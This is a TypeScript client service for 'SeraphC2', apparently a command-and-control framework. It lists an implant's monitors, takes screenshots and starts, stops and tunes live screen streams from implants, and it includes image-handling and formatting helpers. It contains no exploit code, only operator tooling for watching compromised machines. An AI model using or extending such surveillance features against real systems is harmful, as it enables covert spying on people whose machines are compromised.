/**
 * Screen monitoring service for SeraphC2 web client
 * Implements requirements 9.1, 9.2, 9.3 from the SeraphC2 specification
 */

import { apiClient } from './apiClient';

export interface MonitorInfo {
  id: number;
  name: string;
  isPrimary: boolean;
  width: number;
  height: number;
  x: number;
  y: number;
  workingAreaWidth: number;
  workingAreaHeight: number;
  workingAreaX: number;
  workingAreaY: number;
  bitsPerPixel: number;
}

export interface ScreenStreamConfig {
  monitorId?: number;
  quality: number;
  frameRate: number;
  width?: number;
  height?: number;
  captureMouseCursor: boolean;
}

export interface ScreenStreamFrame {
  frameId: number;
  timestamp: Date;
  monitorId: number;
  width: number;
  height: number;
  imageData: string;
  size: number;
}

export interface ScreenStreamStatus {
  isActive: boolean;
  monitorId: number;
  config: ScreenStreamConfig;
  frameCount: number;
  totalDataSent: number;
  averageFrameSize: number;
  actualFrameRate: number;
  startTime?: Date;
  lastFrameTime?: Date;
}

export interface ScreenshotRequest {
  implantId: string;
  monitorId?: number;
  quality?: number;
  width?: number;
  height?: number;
  captureMouseCursor?: boolean;
}

export interface ScreenshotResult {
  monitorId: number;
  width: number;
  height: number;
  imageData: string;
  size: number;
  timestamp: Date;
  capturedMouseCursor: boolean;
}

export interface ScreenMonitoringResponse {
  monitors: MonitorInfo[];
  totalCount: number;
  timestamp: Date;
}

export interface ScreenStreamStartResult {
  success: boolean;
  message: string;
  streamId?: string;
  config?: ScreenStreamConfig;
}

export interface ScreenStreamStopResult {
  success: boolean;
  message: string;
  streamId?: string;
  frameCount?: number;
  totalDataSent?: number;
}

export interface ActiveStreamsResponse {
  streams: Array<
    {
      streamId: string;
      implantId: string;
    } & ScreenStreamStatus
  >;
  totalCount: number;
}

class ScreenService {
  /**
   * Get available monitors for an implant
   */
  async getMonitors(implantId: string): Promise<ScreenMonitoringResponse> {
    try {
      const response = await apiClient.get(`/api/screen/implants/${implantId}/monitors`);
      return response.data.data;
    } catch (error) {
      console.error('Failed to get monitors:', error);
      throw new Error('Failed to get monitor information');
    }
  }

  /**
   * Take a screenshot from an implant
   */
  async takeScreenshot(request: ScreenshotRequest): Promise<ScreenshotResult> {
    try {
      const { implantId, ...payload } = request;
      const response = await apiClient.post(
        `/api/screen/implants/${implantId}/screenshot`,
        payload
      );
      return response.data.data;
    } catch (error) {
      console.error('Failed to take screenshot:', error);
      throw new Error('Failed to take screenshot');
    }
  }

  /**
   * Start screen streaming from an implant
   */
  async startScreenStream(
    implantId: string,
    config: ScreenStreamConfig
  ): Promise<ScreenStreamStartResult> {
    try {
      const response = await apiClient.post(
        `/api/screen/implants/${implantId}/stream/start`,
        config
      );
      return response.data;
    } catch (error) {
      console.error('Failed to start screen stream:', error);
      throw new Error('Failed to start screen stream');
    }
  }

  /**
   * Stop screen streaming from an implant
   */
  async stopScreenStream(implantId: string): Promise<ScreenStreamStopResult> {
    try {
      const response = await apiClient.post(`/api/screen/implants/${implantId}/stream/stop`);
      return response.data;
    } catch (error) {
      console.error('Failed to stop screen stream:', error);
      throw new Error('Failed to stop screen stream');
    }
  }

  /**
   * Update screen stream configuration
   */
  async updateStreamConfig(
    implantId: string,
    config: Partial<ScreenStreamConfig>
  ): Promise<{ success: boolean; message: string }> {
    try {
      const response = await apiClient.put(
        `/api/screen/implants/${implantId}/stream/config`,
        config
      );
      return response.data;
    } catch (error) {
      console.error('Failed to update stream config:', error);
      throw new Error('Failed to update stream configuration');
    }
  }

  /**
   * Get stream status for an implant
   */
  async getStreamStatus(implantId: string): Promise<ScreenStreamStatus | null> {
    try {
      const response = await apiClient.get(`/api/screen/implants/${implantId}/stream/status`);
      return response.data.data;
    } catch (error) {
      console.error('Failed to get stream status:', error);
      throw new Error('Failed to get stream status');
    }
  }

  /**
   * Get all active streams
   */
  async getActiveStreams(): Promise<ActiveStreamsResponse> {
    try {
      const response = await apiClient.get('/api/screen/streams/active');
      return response.data.data;
    } catch (error) {
      console.error('Failed to get active streams:', error);
      throw new Error('Failed to get active streams');
    }
  }

  /**
   * Create a blob URL from base64 image data
   */
  createImageBlobUrl(base64Data: string): string {
    try {
      // Remove data URL prefix if present
      const base64 = base64Data.replace(/^data:image\/[a-z]+;base64,/, '');

      // Convert base64 to binary
      const binaryString = atob(base64);
      const bytes = new Uint8Array(binaryString.length);

      for (let i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }

      // Create blob and return URL
      const blob = new Blob([bytes], { type: 'image/jpeg' });
      return URL.createObjectURL(blob);
    } catch (error) {
      console.error('Failed to create image blob URL:', error);
      throw new Error('Failed to process image data');
    }
  }

  /**
   * Revoke a blob URL to free memory
   */
  revokeBlobUrl(url: string): void {
    try {
      URL.revokeObjectURL(url);
    } catch (error) {
      console.error('Failed to revoke blob URL:', error);
    }
  }

  /**
   * Download screenshot as file
   */
  downloadScreenshot(screenshot: ScreenshotResult, filename?: string): void {
    try {
      const blobUrl = this.createImageBlobUrl(screenshot.imageData);
      const link = document.createElement('a');
      link.href = blobUrl;
      link.download =
        filename ||
        `screenshot_${screenshot.monitorId}_${new Date().toISOString().replace(/[:.]/g, '-')}.jpg`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      this.revokeBlobUrl(blobUrl);
    } catch (error) {
      console.error('Failed to download screenshot:', error);
      throw new Error('Failed to download screenshot');
    }
  }

  /**
   * Format file size for display
   */
  formatFileSize(bytes: number): string {
    if (bytes === 0) return '0 B';

    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  /**
   * Format frame rate for display
   */
  formatFrameRate(fps: number): string {
    return `${fps.toFixed(1)} FPS`;
  }

  /**
   * Calculate bandwidth from frame data
   */
  calculateBandwidth(totalBytes: number, durationSeconds: number): string {
    if (durationSeconds === 0) return '0 B/s';

    const bytesPerSecond = totalBytes / durationSeconds;
    return `${this.formatFileSize(bytesPerSecond)}/s`;
  }

  /**
   * Validate screen stream configuration
   */
  validateStreamConfig(config: ScreenStreamConfig): string[] {
    const errors: string[] = [];

    if (config.quality < 1 || config.quality > 100) {
      errors.push('Quality must be between 1 and 100');
    }

    if (config.frameRate < 1 || config.frameRate > 30) {
      errors.push('Frame rate must be between 1 and 30 FPS');
    }

    if (config.width && config.width < 1) {
      errors.push('Width must be a positive number');
    }

    if (config.height && config.height < 1) {
      errors.push('Height must be a positive number');
    }

    if (config.monitorId !== undefined && config.monitorId < 0) {
      errors.push('Monitor ID must be non-negative');
    }

    return errors;
  }

  /**
   * Get recommended quality settings based on frame rate
   */
  getRecommendedQuality(frameRate: number): number {
    if (frameRate <= 5) return 90;
    if (frameRate <= 10) return 80;
    if (frameRate <= 15) return 70;
    if (frameRate <= 20) return 60;
    return 50;
  }

  /**
   * Get recommended frame rate based on use case
   */
  getRecommendedFrameRate(useCase: 'monitoring' | 'interaction' | 'recording'): number {
    switch (useCase) {
      case 'monitoring':
        return 2;
      case 'interaction':
        return 15;
      case 'recording':
        return 10;
      default:
        return 5;
    }
  }
}

export const screenService = new ScreenService();
export default screenService;
